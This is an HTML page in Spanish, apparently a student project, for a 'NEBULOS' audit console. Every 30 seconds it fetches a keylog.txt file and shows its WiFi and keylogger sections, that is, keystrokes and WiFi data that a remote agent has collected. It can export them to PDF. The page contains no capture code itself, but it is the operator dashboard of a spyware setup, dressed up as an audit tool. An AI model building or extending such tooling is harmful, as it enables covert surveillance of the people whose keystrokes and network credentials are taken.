<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>NEBULOS | Auditoría DAM</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 30px; }
        .panel { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 20px #003300; }
        .tabs { margin-bottom: 20px; }
        button { background: black; color: #00ff41; border: 1px solid #00ff41; padding: 10px; cursor: pointer; margin-right: 5px; }
        button:hover, .active { background: #00ff41; color: black; }
        #console { background: #000; border: 1px dotted #00ff41; height: 450px; overflow-y: auto; padding: 15px; white-space: pre-wrap; }
        .status { font-size: 0.8em; margin-top: 10px; color: #888; }
    </style>
</head>
<body>

<div class="panel">
    <h2>[ PROJECT NEBULOS - AUDIT CONSOLE ]</h2>
    
    <div class="tabs">
        <button class="t-btn active" onclick="setView('full')">REPORTE</button>
        <button class="t-btn" onclick="setView('wifi')">WIFI</button>
        <button class="t-btn" onclick="setView('keys')">TECLADO</button>
        <button onclick="descargarPDF()" style="border-color: red; color: red;">PDF</button>
    </div>

    <div id="console">Conectando con agente remoto...</div>
    <div class="status" id="status">Sync: Esperando datos...</div>
</div>

<script>
    let rawContent = "";

    async function fetchData() {
        try {
            const r = await fetch('keylog.txt?t=' + Math.random());
            if (r.ok) {
                rawContent = await r.text();
                updateUI();
                document.getElementById('status').textContent = "Sync: OK - " + new Date().toLocaleTimeString();
            }
        } catch (e) { console.log("Error de conexión"); }
    }

    function setView(mode) {
        document.querySelectorAll('.t-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');
        updateUI(mode);
    }

    function updateUI(mode = 'full') {
        const box = document.getElementById('console');
        if (mode === 'wifi') {
            box.textContent = rawContent.split('--- MODULO WIFI ---')[1]?.split('--- MODULO KEYLOGGER ---')[0] || "No hay datos WiFi";
        } else if (mode === 'keys') {
            box.textContent = rawContent.split('--- MODULO KEYLOGGER ---')[1] || "No hay pulsaciones";
        } else {
            box.textContent = rawContent;
        }
        box.scrollTop = box.scrollHeight;
    }

    function descargarPDF() {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        doc.text("NEBULOS AUDIT REPORT", 10, 10);
        doc.text("Fecha: " + new Date().toLocaleString(), 10, 20);
        const split = doc.splitTextToSize(rawContent, 180);
        doc.text(split, 10, 30);
        doc.save("Reporte_DAM.pdf");
    }

    setInterval(fetchData, 30000);
    fetchData();
</script>
</body>
</html>
